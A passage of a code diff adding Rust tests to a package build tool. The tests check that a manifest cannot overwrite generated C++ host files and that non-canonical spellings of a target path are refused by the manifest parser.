+        // UI47 §5.5.5 pins its acceptance to. This function returns only the
+        // paths it wrote, so allowing a replacement here would take over the
+        // application boundary with that field coming back empty.
+        let root = scratch();
+        let generated = root.join("out").join("main.cpp");
+        fs::write(&generated, b"// generated entry point\n").expect("write the generated file");
+
+        let error = install_host_effects(
+            &manifest_targeting("main.cpp"),
+            Backend::Qt,
+            &root,
+            &root.join("out"),
+        )
+        .expect_err("replacing a generated file must be refused");
+        let message = format!("{error:?}");
+        assert!(
+            message.contains("would replace a generated file"),
+            "the refusal must say why: {message}"
+        );
+        // And it must not have clobbered it on the way to failing.
+        assert_eq!(
+            fs::read_to_string(&generated).expect("read the generated file"),
+            "// generated entry point\n"
+        );
+        let _ = fs::remove_dir_all(&root);
+    }
+
+    #[test]
+    fn a_new_file_beside_generated_output_is_allowed() {
+        // The guard must bound replacement, not the ordinary case: a handler
+        // source sitting next to generated files is exactly what the section is
+        // for.
+        let root = scratch();
+        fs::write(root.join("out/main.cpp"), b"// generated\n").expect("write a generated file");
+
+        let written = install_host_effects(
+            &manifest_targeting("probe_effects.h"),
+            Backend::Qt,
+            &root,
+            &root.join("out"),
+        )
+        .expect("a new file must be allowed");
+        assert_eq!(written.len(), 1);
+        assert!(root.join("out/probe_effects.h").exists());
+        let _ = fs::remove_dir_all(&root);
+    }
+}
+
+#[cfg(test)]
+mod host_asset_spelling_tests {
+
+    /// The normalisation spellings that used to be exercised through the
+    /// builder are now refused by the manifest, which is a stronger outcome.
+    ///
+    /// `alternate_spellings_of_the_generated_host_are_still_detected` used to
+    /// drive `MosaicHost.cpp/` and `MosaicHost.cpp/.` through a full build and
+    /// assert they were *reported* as replacements. They no longer parse, so
+    /// they cannot reach a build to be reported — allowed-and-disclosed became
+    /// refused-outright. That is the better answer, but the check has to live
+    /// somewhere or the coverage is simply gone.
+    #[test]
+    fn normalisation_spellings_of_a_generated_target_do_not_parse() {
+        for spelling in ["MosaicHost.cpp/", "MosaicHost.cpp/.", "./MosaicHost.cpp"] {
+            let manifest = format!(
+                r#"
+[package]
+name = "mosaic-pkg-probe"
+version = "0.1.0"
+description = "probe"
+license = "MIT"
+
+[components]
+exports = ["Probe"]
+
+[dependencies]
+
+[host_assets]
+files = [
+  {{ backend = "qt", source = "host/qt/MosaicHost.cpp", target = "{spelling}" }},
+]
+
+[kernel]
+version = "1"
+"#
+            );
+            assert!(
+                mosaic_package_manifest::parse(&manifest).is_err(),
+                "`{spelling}` must be refused by the manifest"
+            );
+        }
+    }
+
+    /// And the plain spelling still parses, so the refusal above is a shape
+    /// check rather than a blanket ban on naming a generated file.
+    ///
+    /// Naming one is legitimate: replacing `MosaicHost.cpp` is exactly what
+    /// `[host_assets]` is for, and it is disclosed through
+    /// `replacedGeneratedFiles`. Only `[host_effects]` refuses replacement.
+    #[test]
+    fn the_plain_spelling_of_a_generated_target_still_parses() {
+        let manifest = r#"
+[package]
+name = "mosaic-pkg-probe"
+version = "0.1.0"
+description = "probe"
+license = "MIT"
+
+[components]
+exports = ["Probe"]
+
+[dependencies]
+
+[host_assets]
+files = [
+  { backend = "qt", source = "host/qt/MosaicHost.cpp", target = "MosaicHost.cpp" },
+]
+
+[kernel]
+version = "1"
+"#;
+        assert!(
+            mosaic_package_manifest::parse(manifest).is_ok(),
+            "replacing a generated file through `[host_assets]` must stay legal"
+        );
     }
 }
